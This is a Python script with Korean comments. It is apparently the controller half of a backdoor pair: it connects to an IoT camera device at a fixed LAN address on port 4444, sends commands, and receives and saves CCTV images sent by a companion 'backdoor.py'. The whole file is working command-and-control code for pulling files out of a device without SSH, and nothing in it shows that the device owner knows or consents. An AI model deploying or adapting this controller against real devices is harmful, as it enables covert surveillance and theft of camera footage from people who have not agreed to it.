# master.py
# IoT 기기와 SSH연결이 되어있지 않더라도 자신의 IP주소와 포트를 통해 IoT 기기로부터 정보를 전달받는 프로그램

import socket   # 서로 다른 호스트에 존재하는 기기끼리 통신하기 위해 Socket API import
import sys      # 예외처리시 프로그램을 종료하기 위해 sys import
import time     # 시간 정보를 사용하기 위해 time import
import json     # TCP 통신에서 데이터를 담을 컨테이너로 json 사용

# IoT 기기로부터 전송받은 이미지를 저장할 파일 저장경로
src = "C:\\Users\\Windows8\\Desktop\\CCTV_Image\\"

def fileName():     # time을 사용하여 전달받은 파일의 이름을 설정
    dte = time.localtime()
    Year = dte.tm_year
    Mon = dte.tm_mon
    Day = dte.tm_mday
    WDay = dte.tm_wday
    Hour = dte.tm_hour
    Min = dte.tm_min
    Sec = dte.tm_sec
    imgFileName = src + str(Year) + '_' + str(Mon) + '_' + str(Day) + '_' + str(Hour) + '_' + str(Min) + '_' + str(
        Sec) + '.bmp';
    return imgFileName

def save_img(data): # 전달받은 이미지를 저장하는 함수
    img_fileName = fileName()               # fileName() 함수를 통해 저장할 파일의 이름 설정
    img_file = open(img_fileName, "wb")     # 파일을 저장하기 위해 쓰기 모드로 지정한 이름의 파일 생성
    print("finish img recv")                # 서버에게 정보를 전달받았다는 안내 문구
    print(sys.getsizeof(data))              # 인자로 전달받은 data의 크기를 출력
    img_file.write(data)                    # wb모드로 생성한 img_file에 전달받은 data를 입력
    time.sleep(0.2)
    img_file.close()                        # img_file 스트림을 close
    print("Finish ")                        # 파일 저장을 나타내는 안내 문구 출력

def receive_img():  # 클라이언트에게 이미지를 전달받는 프로그램
    numdata = client_socket.recv(1024).decode()   # 전달받는 디렉토리에 존재하는 파일의 개수를 먼저 전달받음
    num = json.loads(numdata)   # 데이터를 decode한 다음 json 형태에서 loads
    num = num.get("filenum")    # 파일의 개수를 전달받음

    for i in range(num):        # 디렉토리에 존재하는 파일의 개수만큼 for문 진행
        size_data = client_socket.recv(1024)         # 연결된 클라이언트 소켓에게 데이터를 전달받음
        size = json.loads(size_data).get("filesize") # 전달받을 파일의 크기를 get

        img_data = client_socket.recv(1024)     # backdoor.py로부터 파일 데이터 전달받음
        data = img_data                         # data 변수에 img_data를 저장
        if img_data:                            # 전달받은 img_data가 존재한다면 실행
            while True:                         # 종료 조건을 만나기 전까지 실행
                img_data = client_socket.recv(1024) # 파일을 다 전송받기 전까지 수신
                data += img_data                    # data 변수에 전달받는 img_data를 추가적으로 저장
                if len(data) == size:           # 저장한 파일의 크기가, 전달받은 파일의 크기와 같다면 종료
                    break
            save_img(data) # save_img 함수에 클라이언트에게 전송받은 data를 인자로 전달

def run_master(client_socket):               # master.py 프로그램을 실행하는 함수
    while True:
        command = input("input command >> ")            # 사용자로부터 명령어를 입력받음
        if command == 'get':
            client_socket.send(command.encode())              # 서버에게 데이터 전송을 요청하기 위해 'get 데이터 전송
            file_count = client_socket.recv(1024).decode()  # 서버로부터 서브 디렉토리의 개수 수신
            file_count = json.loads(file_count)              # json 자료형 데이터를 loads하여 저장
            size = file_count.get("size")   # for문에서 사용할 서브 디렉토리 개수 저장
            for i in range(size):           # 전달받은 서브 디렉토리의 길이만큼 for문 실행
                receive_img()               # 이미지를 전송 받아서 저장
        elif command == 'terminate':
            client_socket.send(command.encode())  # 서버에게 프로그램 종료를 알림
            print('terminate program')
            client_socket.close()
            sys.exit(0)


if __name__ == '__main__':
    # 클라이언트 소켓을 생성하며 지정된 IP와 포트의 서버주소와 연결
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect(("192.168.0.11", 4444))
    # 서버로부터 전송받은 데이터를 저장하는 run_master 함수 실행
    run_master(client_socket)

